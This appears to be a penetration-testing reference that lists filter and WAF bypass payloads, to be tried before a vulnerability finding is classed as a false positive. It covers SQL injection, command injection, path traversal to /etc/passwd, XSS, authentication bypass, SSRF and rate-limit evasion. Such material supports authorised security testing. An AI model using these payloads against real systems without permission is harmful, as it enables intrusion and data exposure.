# Bypass Techniques

Common filter/WAF bypasses. Used during the bypass-exhaustion phase
before classifying a finding as false positive.

A finding may only be marked `false_positive` AFTER the relevant
bypass set has been exhausted and the witnesses still fail.

## SQL Injection Bypasses

When `'` is filtered/escaped:
- Numeric injection: drop the quote, use `1 OR 1=1`
- Different quote: `"` instead of `'`
- Comment-based: `1/**/OR/**/1=1`
- Hex literal: `0x61646d696e` for `admin`
- `CHAR(65,66)` for `AB`
- Case variation: `OoRr` (often stripped to `OR`)
- Inline comments: `O/**/R`
- Null byte: `' %00 OR '1`=`1`
- Double URL encoding: `%2527` for `'`
- Multi-byte: `%bf%27` (works against some single-byte unescape)

## Command Injection Bypasses

When semicolons filtered:
- Newline: `%0Asleep 5`
- Carriage return: `%0Dsleep 5`
- Pipe: `|sleep 5`, `||sleep 5`
- Background: `&sleep 5`, `&&sleep 5`
- Substitution: `$(sleep 5)`, `` `sleep 5` ``
- Globbing: `/???/?l??p 5` for `/bin/sleep 5`
- IFS for spaces: `sleep${IFS}5`, `sleep$IFS$95`
- Quote evasion: `s""leep 5`, `s'l'eep 5`
- Variable: `a=sl;b=eep;${a}${b} 5`
- Encoding: `bash<<<$(base64 -d <<< c2xlZXAgNQo=)`

## Path Traversal Bypasses

When `../` filtered:
- URL-encoded: `%2e%2e%2f`
- Double URL-encoded: `%252e%252e%252f`
- Unicode: `%c0%ae%c0%ae%c0%af`, `%uff0e%uff0e%u2215`
- Mixed: `..%2f`, `%2e./`
- Null byte (older platforms): `../../../etc/passwd%00.png`
- Backslash on Windows: `..\..\..\windows\win.ini`
- Absolute path: `/etc/passwd` (skips traversal entirely)

When base dir is prepended (`/var/www/uploads/${v}`):
- The traversal still works if `realpath` not enforced
- Try ending the path early: `../../etc/passwd%00`

## XSS Bypasses

When `<script>` blocked:
- `<img src=x onerror=...>`
- `<svg/onload=...>`
- `<iframe srcdoc="...">`
- `<details ontoggle=...>` (HTML5)
- `<video><source onerror=...>`
- `<input autofocus onfocus=...>`

When parens filtered:
- Template literals: `onerror=alert\`1\``
- `onerror=eval('alert(1)')` → `onerror=eval(name)` + set
  `window.name` from attacker page

When event handlers stripped:
- `<a href="javascript:alert(1)">` (often still works)
- `<form action="javascript:alert(1)"><input type=submit>`
- SVG: `<svg><animate attributeName=href values=javascript:alert(1) ...>`

When `alert` filtered:
- `confirm(1)`, `prompt(1)`, `print()`
- `top.alert(1)`, `self['ale'+'rt'](1)`
- `window['ale\u0072t'](1)` (unicode in property access)
- `Function("alert(1)")()`

CSP bypasses (require CSP misconfig):
- `unsafe-inline` allows everything
- `unsafe-eval` allows `eval`/`Function`
- Wildcard sources (`*.googleapis.com`) — angular/jsonp gadgets
- `'strict-dynamic'` without nonce/hash on inline → still blocked but
  external scripts allowed via trusted loader
- Old CSP without `default-src`/`script-src` → only blocks listed

## Authentication Bypasses

- HTTP verb tampering: `GET /admin` blocked → try `POST`, `PUT`, `OPTIONS`
- Path normalization: `/admin/` blocked → try `/admin`, `/admin/.`,
  `/admin/x/..`, `//admin`, `/%2e/admin`, `/Admin` (case)
- Header injection: `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`,
  `X-Real-IP: 127.0.0.1`, `X-Forwarded-Proto: https`
- Trailing chars: `/admin#`, `/admin?`, `/admin/`, `/admin.json`,
  `/admin..;/`, `/admin/..;/`
- Method confusion via `X-HTTP-Method-Override: GET`

## SSRF Bypasses

When `127.0.0.1` blocked:
- IPv6 loopback: `[::1]`, `[0:0:0:0:0:0:0:1]`
- Decimal IP: `2130706433` for `127.0.0.1`
- Hex IP: `0x7f000001`
- Octal: `0177.0.0.1`
- Short form: `127.1`, `0.0.0.0`, `0`
- DNS rebinding: control a DNS server, return `127.0.0.1` on second
  resolution (TTL=0)
- DNS records that resolve to internal IPs: `localtest.me` (127.0.0.1)
- URL parsing differentials: `http://allowed-host@127.0.0.1`,
  `http://127.0.0.1#@allowed-host`
- IDN homograph: `http://1．0．0．1` (fullwidth dots)

When schemes blocked:
- `gopher://`, `dict://`, `file://`, `ftp://`
- `data:` (for content-type bypass)
- `jar:` (Java)

## Rate Limit Bypasses

- Header rotation: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`,
  `X-Client-IP`, `X-Cluster-Client-IP`, `Forwarded`
- Case: `X-FORWARDED-FOR`
- User-Agent variation
- Different endpoint that hits same handler

## Bypass Discipline

For each bypass attempt:
1. Note WHAT you tried and WHY it might work (in your evidence log)
2. Capture the response
3. If still blocked, move to the next item in the bypass set
4. Only after the documented bypass set is exhausted do you write
   `verdict: false_positive` with reason "bypass set exhausted; defense
   appears effective for this slot type."
